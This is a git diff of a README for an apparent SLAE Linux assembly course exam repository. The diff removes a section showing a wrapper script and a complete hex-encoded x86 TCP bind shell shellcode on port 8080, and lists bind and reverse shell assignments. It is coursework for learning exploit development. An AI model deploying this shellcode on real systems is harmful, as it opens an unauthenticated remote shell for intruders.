@@ -3,20 +3,10 @@ Repository for the SLAE exam
 Student **SLAE-891**  
 [http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)  
   
-## Assignment 1
-Shell_Bind_TCP Shellcode  
+ - Assignment 1 - Shell_Bind_TCP Shellcode
+ - Assignment 2 - Shell_Reverse_TCP Shellcode
   
-You can customize the listening port and generate the TCP bind shellcode with the following command:  
-```bash
-./wrapper.sh
-Usage: ./wrapper.sh <port_number> <pattern> <file>
-```
-```bash
-./wrapper.sh 8080 PORT ./shell_bind_tcp.template 
-[+] Assembling with Nasm ... 
-[+] Linking ...
-[+] Done!
-"\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x66\x68\x1f\x90\x66\x6a\x02\x89\xe3\x6a\x10\x53\x57\x31\xdb\xf7\xe3\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x52\x57\x31\xdb\xf7\xe3\xb0\x66\xb3\x04\x89\xe1\xcd\x80\x31\xdb\xf7\xe3\x52\x52\x57\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
-```  
+*Each assignment directory will provide an example of command line in order to generate your shellcode*  
+
   
 
